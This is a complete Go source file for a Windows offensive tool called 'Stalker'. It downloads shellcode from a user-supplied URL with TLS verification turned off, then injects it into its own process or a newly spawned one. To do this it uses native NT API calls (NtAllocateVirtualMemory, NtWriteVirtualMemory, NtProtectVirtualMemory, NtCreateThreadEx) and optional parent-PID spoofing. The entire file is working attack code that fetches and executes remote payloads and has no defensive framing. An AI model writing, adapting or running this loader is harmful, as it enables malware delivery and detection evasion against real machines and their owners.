package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"github.com/alexflint/go-arg"
	"golang.org/x/sync/errgroup"
	"golang.org/x/sys/windows"
)

type args struct {
	Url    string `arg:"-u,required"`
	Target string `arg:"-t"`
	Parent uint   `arg:"-p"`
	Kill   bool   `arg:"-k"`
}

const NULL = uintptr(0)

func ConvertNtStatusToDosError(ntstatus uint) uint {
	ntdll := windows.NewLazyDLL("ntdll")
	RtlNtStatusToDosError := ntdll.NewProc("RtlNtStatusToDosError")
	dosErrorCode, _, _ := RtlNtStatusToDosError.Call(uintptr(ntstatus))
	return uint(dosErrorCode)
}

func GetErrorMessage(errCode uint) string {
	buffer := make([]uint16, 512)
	args := []byte{0}
	langid := uint32(1024)
	_, err := windows.FormatMessage(
		windows.FORMAT_MESSAGE_FROM_SYSTEM|windows.FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		uint32(errCode),
		langid,
		buffer,
		&args[0],
	)
	if err != nil {
		fmt.Println(errCode)
		fmt.Printf("[!] Unable to get error message from error code: %s", err.Error())
		os.Exit(1)
	}
	return syscall.UTF16ToString(buffer)
}

func banner() string {
	return "Process Injection 2: Stalker (NT API)\n"
}

func display(url, target string, parent uint, kill bool) {
	fmt.Printf("[*] Payload: %s\n", url)
	if target == "" {
		fmt.Println("[*] Target: Self-injection")
	} else {
		fmt.Printf("[*] Target: %s\n", target)
	}
	fmt.Printf("[*] PPID Spoofing: %d\n", parent)
	fmt.Printf("[*] Kill: %t\n", kill)
}

func spawnProcess(target string, parent uint, pi *windows.ProcessInformation) {
	cmdline, _ := syscall.UTF16PtrFromString(target)
	if parent > 0 {
		si := new(windows.StartupInfoEx)
		si.Cb = uint32(unsafe.Sizeof(*si))
		// si.Cb = uint32(unsafe.Sizeof(windows.StartupInfoEx{}))
		hParent, err := windows.OpenProcess(windows.MAXIMUM_ALLOWED, false, uint32(parent))
		if err != nil {
			fmt.Printf("[!] OpenProcess: %s", err.Error())
		}
		attributeListContainer, err := windows.NewProcThreadAttributeList(1)
		if err != nil {
			fmt.Printf("[!] NewProcThreadAttributeList: %s", err.Error())
			os.Exit(1)
		}
		attributeListContainer.Update(windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, unsafe.Pointer(&hParent), unsafe.Sizeof(hParent))
		si.ProcThreadAttributeList = attributeListContainer.List()
		err = windows.CreateProcess(nil, cmdline, nil, nil, false, windows.EXTENDED_STARTUPINFO_PRESENT, nil, nil, &si.StartupInfo, pi)
		if err != nil {
			fmt.Printf("[!] CreateProcess: %s", err.Error())
		}
	} else {
		si := new(windows.StartupInfo)
		err := windows.CreateProcess(nil, cmdline, nil, nil, false, 0, nil, nil, si, pi)
		if err != nil {
			fmt.Printf("[!] CreateProcess: %s", err.Error())
		}
	}
}

func fetch(url string, rc chan *http.Response) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Get(url)
	if err == nil {
		if resp.StatusCode >= 400 {
			fmt.Printf("[!] Unable to fetch payload: %s", resp.Status)
			os.Exit(1)
		}
		rc <- resp
	}
	return err
}

func main() {
	var opts args
	arg.MustParse(&opts)
	fmt.Println(banner())
	display(opts.Url, opts.Target, opts.Parent, opts.Kill)

	rc := make(chan *http.Response, 1)
	errGrp, _ := errgroup.WithContext(context.Background())
	fmt.Println("[+] Fetching payload asynchronously")
	errGrp.Go(func() error { return fetch(opts.Url, rc) })

	hTarget := windows.CurrentProcess()
	if opts.Target != "" {
		fmt.Println("[+] CreateProcess")
		pi := new(windows.ProcessInformation)
		spawnProcess(opts.Target, opts.Parent, pi)
		hTarget = pi.Process
		fmt.Printf("    PID: %d\n", pi.ProcessId)
	}

	defer func() {
		fmt.Println("[+] Closing process handle")
		windows.CloseHandle(hTarget)
	}()

	fmt.Println("[+] Waiting for payload to finish downloading")
	err := errGrp.Wait()
	if err != nil {
		fmt.Printf("Unable to fetch payload: %s", err.Error())
		os.Exit(1)
	}
	scResp := <-rc
	defer scResp.Body.Close()
	sc, _ := io.ReadAll(scResp.Body)
	fmt.Println("    Done")

	ntdll := windows.NewLazyDLL("ntdll")
	NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	var baseAddress uintptr
	regionSize := len(sc)
	fmt.Println("[+] NtAllocateVirtualMemory")
	ret, _, _ := NtAllocateVirtualMemory.Call(uintptr(hTarget), uintptr(unsafe.Pointer(&baseAddress)), 0, uintptr(unsafe.Pointer(&regionSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if ret != uintptr(windows.STATUS_SUCCESS) {
		fmt.Printf("[!] NtAllocateVirtualMemory: %s", GetErrorMessage(ConvertNtStatusToDosError(uint(ret))))
		os.Exit(1)
	}
	fmt.Printf("    Address: %#x (PAGE_READWRITE)\n", baseAddress)

	NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	var nb uint
	fmt.Println("[+] NtWriteVirtualMemory")
	ret, _, _ = NtWriteVirtualMemory.Call(uintptr(hTarget), baseAddress, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&nb)))
	if ret != uintptr(windows.STATUS_SUCCESS) {
		fmt.Printf("[!] NtWriteVirtualMemory: %s", GetErrorMessage(ConvertNtStatusToDosError(uint(ret))))
		os.Exit(1)
	}
	fmt.Println("    Shellcode injected")

	NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	var oldProtection uint
	fmt.Println("[+] NtProtectVirtualMemory")
	ret, _, _ = NtProtectVirtualMemory.Call(uintptr(hTarget), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&nb)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtection)))
	if ret != uintptr(windows.STATUS_SUCCESS) {
		fmt.Printf("[!] NtProtectVirtualMemory: %s", GetErrorMessage(ConvertNtStatusToDosError(uint(ret))))
		os.Exit(1)
	}
	fmt.Println("    Shellcode marked as executable")

	NtCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
	var hThread windows.Handle
	fmt.Println("[+] NtCreateThreadEx")
	ret, _, _ = NtCreateThreadEx.Call(uintptr(unsafe.Pointer(&hThread)), windows.STANDARD_RIGHTS_ALL|windows.SPECIFIC_RIGHTS_ALL, NULL, uintptr(hTarget), baseAddress, NULL, 0, 0, 0, 0, NULL)
	if ret != uintptr(windows.STATUS_SUCCESS) {
		fmt.Printf("[!] NtCreateThreadEx: %s", GetErrorMessage(ConvertNtStatusToDosError(uint(ret))))
		os.Exit(1)
	}
	fmt.Println("    Executing shellcode")

	defer func() {
		fmt.Println("[+] Closing thread handle")
		windows.CloseHandle(hThread)
	}()

	if opts.Target == "" {
		fmt.Println("[+] NtWaitForSingleObject")
		fmt.Println("    Keeping process alive")
		NtWaitForSingleObject := ntdll.NewProc("NtWaitForSingleObject")
		NtWaitForSingleObject.Call(uintptr(hThread), uintptr(0), NULL)
	}
}
